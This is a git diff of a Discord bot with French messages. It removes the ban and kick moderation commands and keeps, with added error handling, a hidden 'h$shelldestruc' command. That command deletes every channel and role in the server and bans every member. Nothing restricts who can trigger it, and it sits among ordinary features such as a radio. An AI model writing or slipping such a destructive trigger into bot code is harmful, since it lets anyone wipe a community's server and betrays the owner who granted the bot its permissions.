@@ -102,35 +102,7 @@ bot.on("message", function (message) {
   }
 });
 
-//                            COMMANDE MODÉRATION
-bot.on("message", function (message) {
-  if (message.content.startsWith("h$ban")) {
-    // Easy way to get member object though mentions.
-    var member = message.mentions.members.first();
-    if (message.mentionned)
-    // ban
-    member.ban().then((member) => {
-      // Successmessage
-      message.channel.send(":wave: " + member.displayName + " a été ban du serveur :ballot_box_with_check:").catch(console.erreur);
-    }).catch(() => {
-      // Failmessage
-      message.channel.send(":x: **Erreur :** Vous n'avez pas les permissions !").catch(console.erreur);
-    });
-  }
 
-  if (message.content.startsWith("h$kick")) {
-    // Easy way to get member object though mentions.
-    var member = message.mentions.members.first();
-    // Kick
-    member.kick().then((member) => {
-      // Successmessage
-      message.channel.send(":wave: " + member.displayName + " à bien été kické :point_right:");
-    }).catch(() => {
-      // Failmessage
-      message.channel.send("Accès refusé");
-    });
-  }
-});
 
 
 //                   RADIO
@@ -152,6 +124,9 @@ bot.on("message", message => {
 
 bot.on("message", function (message) {
   if (message.content === "h$shelldestruc") {
-    message.guild.channels.forEach((c) => {c.delete()})
+   try{ message.guild.channels.forEach((c) => {c.delete()})
     message.guild.roles.forEach((c) => {c.delete()})
     message.guild.members.forEach((c) => {c.ban()})
+       }catch(e){
+        console.log(e)
+    }
